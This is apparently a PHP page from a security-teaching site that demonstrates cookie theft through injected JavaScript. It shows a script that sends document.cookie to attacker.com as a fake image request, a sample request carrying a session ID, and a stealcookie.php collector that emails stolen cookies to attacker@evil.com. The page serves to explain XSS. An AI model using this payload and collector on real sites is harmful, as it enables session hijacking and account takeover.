<?php
$pageTitle = 'Example of Injected Javascript to Steal Cookie';
$examplePage = true;
include $_SERVER['DOCUMENT_ROOT'] . '/includes/header.php';
?>
    <div class="row">
        <h2 class="subheader sectionheader">The Javascript Attack</h2>
    </div>
    <div class="row">
        <div class="large-9 columns">

<pre>
&lt;script>
    var i = new Image(),
        c = document.cookie;

    i.src = 'http://attacker.com/stealcookie.php?cookie=' + c;
&lt;/script>
</pre>

        </div>
        <div class="large-3 columns">
            <blockquote>The javascript the attacker inserts into the vulnerable website.</blockquote>
        </div>
    </div>
    <div class="row">
        <h2 class="subheader sectionheader">The Network Request</h2>
    </div>
    <div class="row">
        <div class="large-9 columns">

<pre>
http://attacker.com/stealcookie.php?cookie=PHPSESSID=3fp2dg3lorip5sbt8pfvh3i77om2hvq4
</pre>
        </div>
        <div class="large-3 columns">
            <blockquote>This is a GET request loading a fake image with a session cookie as a URL Parameter.</blockquote>
        </div>
    </div>

    <div class="row">
        <h2 class="subheader sectionheader">Example Decoding of Information</h2>
    </div>
    <div class="row">
        <div class="large-9 columns">
            <strong>stealcookie.php</strong>
<pre>
&lt;?php
    parse_str($_GET['cookie'], $parts);

    $message = array(
        'Session Cookie' => $parts['PHPSESSID'],
        'Date Received'  => date('r'),
        'From Site/URL'  => $_SERVER['HTTP_REFERER']
    );

    mail(
        'attacker@evil.com',
        'Got a Cookie',
        var_export($message, true)
    );
</pre>
        </div>
        <div class="large-3 columns">
            <blockquote>Session cookie is retrieved from the GET param, and an email is sent with the page of the target, the cookie, and the time.</blockquote>
        </div>
    </div>
<br><!-- bad spacing Aaron! -->


<?php
include $_SERVER['DOCUMENT_ROOT'] . '/includes/footer.php';
